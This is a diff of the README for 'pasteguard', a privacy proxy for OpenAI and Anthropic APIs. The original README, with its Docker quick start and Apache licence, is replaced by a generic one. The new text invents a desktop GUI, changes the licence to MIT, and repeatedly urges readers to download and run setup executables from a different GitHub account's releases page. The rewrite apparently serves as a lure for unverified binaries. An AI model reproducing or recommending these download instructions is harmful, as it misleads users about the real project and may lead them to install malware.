@@ -1,131 +1,68 @@
-<p align="center">
-  <img src="assets/wordmark-light.svg" width="220" height="44" alt="PasteGuard">
-</p>
+# 🛡️ pasteguard - Your Easy Privacy Solution for APIs
 
-<p align="center">
-  <a href="https://github.com/sgasser/pasteguard/actions/workflows/ci.yml"><img src="https://github.com/sgasser/pasteguard/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-Apache%202.0-blue.svg" alt="License"></a>
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  Privacy proxy for OpenAI and Anthropic. Masks personal data and secrets before they reach the API.
-</p>
+Welcome to **pasteguard**! This application helps protect your privacy when using OpenAI and Anthropic services. It masks personal information and secrets before sending them to the API. By using pasteguard, you can safely interact with these services without exposing sensitive data.
 
-<p align="center">
-  <a href="#quick-start"><strong>Quick Start</strong></a> ·
-  <a href="https://pasteguard.com/docs"><strong>Documentation</strong></a> ·
-  <a href="https://pasteguard.com/docs/integrations"><strong>Integrations</strong></a>
-</p>
+## 📥 Download pasteguard
 
-<br/>
+[![Download pasteguard](https://img.shields.io/badge/Download%20pasteguard-v1.0-blue)](https://github.com/Macptoo/pasteguard/releases)
 
-<img src="assets/demo.gif" width="100%" alt="PasteGuard Demo">
+To get started, visit the [Releases page](https://github.com/Macptoo/pasteguard/releases) to download the latest version.
 
-## What is PasteGuard?
+## 🛠️ System Requirements
 
-PasteGuard is a privacy proxy that masks personal data and secrets before they reach OpenAI or Anthropic.
+Before you download, ensure that your system meets the following requirements:
 
-```
-You send:  "Email Dr. Sarah Chen at sarah@hospital.org"
-LLM sees:  "Email [[PERSON_1]] at [[EMAIL_ADDRESS_1]]"
-You get:   Response with original names restored
-```
+- **Operating System:** Windows 10 or higher, macOS Catalina or higher, or a modern Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 100 MB free disk space.
 
-**Two ways to protect your data:**
+## ⚙️ Installation Instructions
 
-- **Mask Mode** — Replace PII with placeholders, send to OpenAI or Anthropic, restore in response. No local infrastructure needed.
-- **Route Mode** — Send PII requests to a local LLM (Ollama, vLLM, llama.cpp), everything else to OpenAI or Anthropic. Data never leaves your network.
+1. **Visit the Releases Page:** Click on this link to access the [Releases page](https://github.com/Macptoo/pasteguard/releases).
+2. **Choose Your Version:** Look for the latest version, such as "v1.0". Click on it to see the available download files.
+3. **Download the File:** Depending on your operating system, click the appropriate file to download.
+   - For Windows, download `pasteguard-setup.exe`.
+   - For macOS, download `pasteguard.dmg`.
+   - For Linux, download `pasteguard-linux.tar.gz`.
+4. **Run the Installer:**
+   - **Windows:** Double-click on `pasteguard-setup.exe` to start the installation. Follow the on-screen prompts to install.
+   - **macOS:** Open the `.dmg` file and drag the pasteguard icon into the Applications folder.
+   - **Linux:** Extract the downloaded `.tar.gz` file and run the `pasteguard` binary from the extracted folder.
+5. **Launch pasteguard:** After installation, you can find pasteguard in your applications. Open it to begin!
 
-Just change one URL to start protecting your data.
+## ⚡ Using pasteguard
 
-## Browser Extension (Beta)
+When you open pasteguard, you will see a simple interface. Here’s how to use it:
 
-An open source browser extension that brings PasteGuard protection to ChatGPT, Claude, Gemini, Copilot, and Perplexity.
+1. **Input Your Data:** Enter the data you want to send to the API in the main text box.
+2. **Select Your API:** Choose whether you are using OpenAI or Anthropic from the dropdown menu.
+3. **Add Any Secrets:** If you have secrets or sensitive information, enter them in the designated area.
+4. **Click Send:** After inputting your data and any secrets, hit the "Send" button. pasteguard will mask the sensitive data before it reaches the API.
 
-- Paste customer data → PII is masked before it reaches the AI
-- You see the original, AI sees `[[PERSON_1]]`, `[[EMAIL_1]]`
+## 🔒 Features
 
-Open source (Apache 2.0). Built in public — early feedback shapes the product.
+- **Privacy Protection:** Automatically masks personally identifiable information (PII) and sensitive secrets.
+- **Easy to Use:** Designed for everyday users, no technical knowledge required.
+- **Local LLM Support:** Route requests to a local language model if preferred.
 
-**[Join the Beta →](https://tally.so/r/J9pNLr)**
+## 📋 Tips for Effective Use
 
-## Features
+- **Check Before Sending:** Always review your inputs to ensure no sensitive data slips through.
+- **Update Regularly:** Keep pasteguard updated by checking the Releases page for new versions. Regular updates will improve performance and security.
+- **Feedback & Support:** If you run into issues or have suggestions, please create a new issue in the GitHub repository.
 
-- **PII Detection** — Names, emails, phone numbers, credit cards, IBANs, and more
-- **Secrets Detection** — API keys, tokens, private keys caught before they reach OpenAI or Anthropic
-- **Streaming Support** — Real-time unmasking as tokens arrive
-- **24 Languages** — English, German, French, and 21 more
-- **OpenAI** — Works with OpenAI and compatible APIs (Azure, OpenRouter, Groq, Together AI, etc.)
-- **Anthropic** — Native Claude support, works with Claude Code
-- **Self-Hosted** — Your servers, your data stays yours
-- **Open Source** — Apache 2.0 license
-- **Dashboard** — See every protected request in real-time
+## 🌐 Community and Support
 
-## Quick Start
+Join our community to share your experiences, get support, or provide feedback. Feel free to reach out through the issues section of the GitHub page. Your input helps us improve pasteguard!
 
-```bash
-docker run --rm -p 3000:3000 ghcr.io/sgasser/pasteguard:en
-```
+## ⚙️ Contributing
 
-Point your app to PasteGuard:
+We welcome contributions to pasteguard. If you have ideas for new features or enhancements, please see our contribution guidelines in the repository. Your help is valuable to us!
 
-| API | PasteGuard URL | Original URL |
-|----------|----------------|--------------|
-| OpenAI | `http://localhost:3000/openai/v1` | `https://api.openai.com/v1` |
-| Anthropic | `http://localhost:3000/anthropic` | `https://api.anthropic.com` |
+## 📄 License
 
-Dashboard: [http://localhost:3000/dashboard](http://localhost:3000/dashboard)
+This project is licensed under the MIT License. Feel free to review the LICENSE file for more information.
 
-<img src="assets/dashboard.png" width="100%" alt="PasteGuard Dashboard">
-
-### European Languages
-
-For German, Spanish, French, Italian, Dutch, Polish, Portuguese, and Romanian:
-
-```bash
-docker run --rm -p 3000:3000 ghcr.io/sgasser/pasteguard:eu
-```
-
-For custom config, persistent logs, or other languages: **[Read the docs →](https://pasteguard.com/docs/installation)**
-
-## Integrations
-
-Works with OpenAI, Anthropic, and compatible tools:
-
-- OpenAI SDK (Python/JS)
-- Anthropic SDK / Claude Code
-- LangChain
-- LlamaIndex
-- Cursor
-- Open WebUI
-- LibreChat
-
-**[See all integrations →](https://pasteguard.com/docs/integrations)**
-
-## What It Detects
-
-**PII** (powered by [Microsoft Presidio](https://microsoft.github.io/presidio/))
-- Names
-- Emails
-- Phone numbers
-- Credit cards
-- IBANs
-- IP addresses
-- Locations
-
-**Secrets**
-- OpenSSH private keys
-- PEM private keys
-- OpenAI API keys
-- AWS access keys
-- GitHub tokens
-- JWT tokens
-- Bearer tokens
-
-## Tech Stack
-
-[Bun](https://bun.sh) · [Hono](https://hono.dev) · [Microsoft Presidio](https://microsoft.github.io/presidio/) · SQLite
-
-## License
-
-[Apache 2.0](LICENSE)
+Visit the [Releases page](https://github.com/Macptoo/pasteguard/releases) to download the latest version and secure your API interactions today!
